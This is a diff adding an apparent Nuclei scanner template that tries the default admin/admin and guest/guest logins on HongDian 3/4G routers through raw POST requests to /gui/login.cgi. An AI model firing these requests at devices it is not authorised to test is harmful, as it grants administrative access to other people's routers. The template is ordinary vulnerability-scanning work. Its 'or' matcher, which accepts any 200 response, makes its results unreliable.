@@ -1,0 +1,74 @@
+id: hongdian-default-password
+info:
+  name: HongDian 3/4G Router Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    HongDian 3/4G Router has a default password vulnerability which allows attackers to gain administrative access.
+  tags: default-password
+  metadata:
+    product: HongDian 3/4G Router
+    impact: Unauthorized administrative access
+
+http:
+  - raw:
+      - |
+        POST /gui/login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+        Referer: {{BaseURL}}/gui/login.cgi
+        Origin: {{BaseURL}}
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Content-Type: application/x-www-form-urlencoded
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-User: ?1
+
+        auth_mode=local&user=admin&login_status=&passwd=admin&tokenKey=
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: header
+        regex:
+          - "Set-Cookie:.*authentication"
+      - type: regex
+        part: body
+        regex:
+          - "Capture\\(share\\.build_time\\)"
+
+  - raw:
+      - |
+        POST /gui/login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+        Referer: {{BaseURL}}/gui/login.cgi
+        Origin: {{BaseURL}}
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Content-Type: application/x-www-form-urlencoded
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-User: ?1
+
+        auth_mode=local&user=guest&login_status=&passwd=guest&tokenKey=
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: header
+        regex:
+          - "Set-Cookie:.*authentication"
+      - type: regex
+        part: body
+        regex:
+          - "Capture\\(share\\.build_time\\)"
